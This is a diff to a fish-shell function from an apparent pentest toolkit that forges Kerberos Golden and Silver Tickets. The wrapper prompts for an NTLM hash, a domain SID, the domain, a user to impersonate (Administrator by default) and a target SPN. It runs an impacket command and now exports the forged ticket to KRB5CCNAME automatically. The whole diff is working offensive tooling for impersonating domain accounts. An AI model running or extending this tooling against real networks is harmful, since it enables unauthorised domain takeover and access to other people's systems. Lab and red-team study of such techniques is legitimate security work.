@@ -27,21 +27,42 @@ function __kronos_ticket --description "Create Golden and Silver Tickets using t
         return 0
     end
 
-    set -l domain $_flag_domain; if test -z "$domain"; set domain $TGT_DC_DOMAIN; end
+    # Capture flags first
+    set -l domain $_flag_domain
+    set -l user $_flag_user
     set -l sid $_flag_sid
     set -l hash $_flag_hash
     set -l spn $_flag_spn
-    set -l user $_flag_user; if test -z "$user"; set user "Administrator"; end
 
     if test "$wizard" -eq 1
         set_color cyan; echo "[*] Starting $subaction ticket wizard..."; set_color normal
-        if test -z "$hash"; set hash (__kronos_ask "NTLM Hash" "$TGT_CRED_PASSWORD"); or return 1; end
-        if test -z "$sid";  set sid (__kronos_ask "Domain SID"); or return 1; end
-        if test -z "$domain"; set domain (__kronos_ask "Domain" "$TGT_DC_DOMAIN"); or return 1; end
-        if test -z "$user"; set user (__kronos_ask "User to impersonate" "Administrator"); or return 1; end
-        if test "$subaction" = "silver" -a -z "$spn"
-            set spn (__kronos_ask "Target SPN (e.g. cifs/dc01.dante.local)"); or return 1
+        
+        # Priority: 1. Flag, 2. TGT default, 3. Empty
+        set -l def_hash "$TGT_CRED_PASSWORD"
+        if test -n "$hash"; set def_hash "$hash"; end
+        set hash (__kronos_ask "NTLM Hash" "$def_hash"); or return 1
+
+        set -l def_sid ""
+        if test -n "$sid"; set def_sid "$sid"; end
+        set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
+
+        set -l def_domain "$TGT_DC_DOMAIN"
+        if test -n "$domain"; set def_domain "$domain"; end
+        set domain (__kronos_ask "Domain FQDN" "$def_domain"); or return 1
+
+        set -l def_user "Administrator"
+        if test -n "$user"; set def_user "$user"; end
+        set user (__kronos_ask "User to impersonate" "$def_user"); or return 1
+        
+        if test "$subaction" = "silver"
+            set -l def_spn ""
+            if test -n "$spn"; set def_spn "$spn"; end
+            set spn (__kronos_ask "Target SPN (e.g. cifs/dc01.dante.local)" "$def_spn"); or return 1
         end
+    else
+        # Non-wizard fallbacks for standard flag usage
+        if test -z "$domain"; set domain "$TGT_DC_DOMAIN"; end
+        if test -z "$user"; set user "Administrator"; end
     end
 
     # Final Validation
@@ -72,7 +93,7 @@ function __kronos_ticket --description "Create Golden and Silver Tickets using t
     command $impacket_cmd $ticket_args
     
     if test -f "$user.ccache"
-        echo "[+] Ticket saved to: $PWD/$user.ccache"
-        echo "Run this to use it: export KRB5CCNAME=$PWD/$user.ccache"
+        set -gx KRB5CCNAME "$PWD/$user.ccache"
+        echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
     end
 end
